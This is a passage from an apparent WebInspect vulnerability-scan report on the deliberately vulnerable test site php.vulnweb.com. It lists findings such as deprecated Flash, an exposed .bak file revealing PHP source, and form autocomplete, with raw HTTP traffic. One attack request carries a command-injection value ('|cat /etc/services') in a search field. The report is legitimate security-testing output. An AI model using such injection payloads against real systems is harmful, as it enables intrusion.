X-Request-Memo: ID="f03de475";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

option=search&search=%7Ccat+%2Fetc%2Fservices]]></AttackHTTPRequest><VulnerabilityID>10561</VulnerabilityID><Severity>1</Severity><Name>Vulnerable Flash Engine Allowed</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Vulnerable Flash Engine" href="https://vulncat.fortify.com/">Flash Misconfiguration: Vulnerable Flash Engine</Classification><Classification kind="CWE" identifier="CWE-937" href="https://cwe.mitre.org/data/definitions/937.html">CWE-937: OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities</Classification></Classifications><DetectionSelection><Location offset="3995" length="201" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />WebInspect has detected the use of Adobe Flash in your application. <br /><br />
Adobe has deprecated Flash with an end-of-life set to the end of 2020.  Flash support has been disabled by default in many browsers, for example Chrome 76 amd Firefox 69. Further, starting in December 2020, Chrome, Firefox and Microsoft Edge will completely eliminate support for Flash.<br /><br />
Adobe Flash has had many vulnerabilities associated with it since its inception.  Of date there are over 1000 CVE’s (Common Vulnerabilities and Exposures) reported against Adobe Flash.  Many of which lead to Remote Code Execution, and Cross-Site Scripting attacks that can compromise user and/or system data and privacy. <br /><br />
Consider updating your application to replace Adobe Flash with safer, alternative technologies that provide similar functionality such as HTML5, WebGL and WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Use of deprecated and vulnerable technology can enable attackers to compromise the target by exploiting known vulnerabilities against the detected server.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Consider replacing the Flash code with safer, alternative technologies such as HTML5, WebGL or WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="https://web.archive.org/web/20171202123704/https://theblog.adobe.com/adobe-flash-update/"><b>Flash and The Future of Interactive Content</b></a><br /><br /><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-6761/Adobe-Flash-Player.html"><b>CVE Details</b></a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="F240660202ECFCDF107178DDFA0BD347"><![CDATA[POST /index.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Content-Length: 45
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="F240660202ECFCDF107178DDFA0BD347";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="None";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3525";Engine="Request+Modify";SmartMode="2";tid="55";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="69c0a6b6";
X-Request-Memo: ID="f03de475";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

option=search&search=%7Ccat+%2Fetc%2Fservices]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:56:45 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4958

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="F240660202ECFCDF107178DDFA0BD347"><Method>POST</Method><Path>/</Path><File>index</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[option=search&search=%7Ccat+%2Fetc%2Fservices]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Content-Length</Name><Value>45</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="F240660202ECFCDF107178DDFA0BD347";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="None";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3525";Engine="Request+Modify";SmartMode="2";tid="55";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="69c0a6b6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="f03de475";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:56:45 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4958</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="CD811DE5F26763847E074C6E95280DA4"><URL>http://php.vulnweb.com:80/index.bak</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="ac045ad1-2bbc-492b-9bf3-744bed9eea51"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11561</EngineType><AttackHTTPRequest><![CDATA[GET /index.bak HTTP/1.1
Referer: http://php.vulnweb.com/index.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CD811DE5F26763847E074C6E95280DA4";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="2087";Engine="File+Extension+Replacement";SmartMode="2";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="41fe607c";
X-Request-Memo: ID="ae725f45";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>2087</VulnerabilityID><Severity>3</Severity><Name>Backup File (.bak)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-530" href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Webinspect has detected a backup file with file extension replaced with .bak on the target server. The severity of the threats posed by the web-accessible backup files depends on the sensitivity of the information stored in original document. Based on that information, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker can use information obtained to craft precise targeted attacks, which may not otherwise be feasible, against the application.

<br />]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker can use the information obtained from the backup file of a sensitive document to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><ul><li> Webroot Security Policy: Implement a security policy that prohibits storage of backup files in webroot. </li><li> Temporary Files: Many tools and editors automatically create temporary files or backup files in the webroot. Be careful when editing files on a production server to avoid inadvertently leaving a backup or temporary copy of the file(s) in the webroot. </li><li> Default Installations: Often, a lot of unnecessary files and folders are installed by default. For instance, IIS installations include demo applications. Be sure to remove any files or folders that are not required for application to work properly. </li><li> Development Backup: Source code back up should not be stored and left available on the webroot. </li></ul>

Further QA can include test cases to look for the presence of backup files in the webroot to ensure none are left in publicly accessible folders of the web application.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)">OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004) </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure </a>]]></SectionText></ReportSection></Issue><Issue id="cc7142c8-ea1f-4842-be45-f7ce459835ee"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2339" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="CD811DE5F26763847E074C6E95280DA4"><![CDATA[GET /index.bak HTTP/1.1
Referer: http://php.vulnweb.com/index.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CD811DE5F26763847E074C6E95280DA4";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="2087";Engine="File+Extension+Replacement";SmartMode="2";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="41fe607c";
X-Request-Memo: ID="ae725f45";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:56:46 GMT
ETag: "4dca64a4-cc1"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 3265

<?PHP require_once("database_connect.php"); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of WASP Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1>   
  <h6 id="siteInfo">TEST and Demonstration site for Acunetix Web Vulnerability Scanner</h6>
  <div id="globalNav"> 
    <a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
	</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
	<a href="guestbook.php">guestbook</a>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for WASP.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
	  <?PHP if (isset($_COOKIE["login"]))echo '<li><a href="../logout.php">Logout</a>'; ?></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p><img src="images/add.jpg" alt="" width="107" height="66"></p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="redir.php?r=index.php">Site
  Map</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wasp@acunetix.com">Contact Us</a> | &copy;2004
  Acunetix Ltd 
</div> 
<br> 
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="CD811DE5F26763847E074C6E95280DA4"><Method>GET</Method><Path>/</Path><File>index</File><Ext>bak</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="CD811DE5F26763847E074C6E95280DA4";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="2087";Engine="File+Extension+Replacement";SmartMode="2";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="41fe607c";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ae725f45";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<?PHP require_once("database_connect.php"); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of WASP Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1>   
  <h6 id="siteInfo">TEST and Demonstration site for Acunetix Web Vulnerability Scanner</h6>
  <div id="globalNav"> 
    <a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
	</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
	<a href="guestbook.php">guestbook</a>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for WASP.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
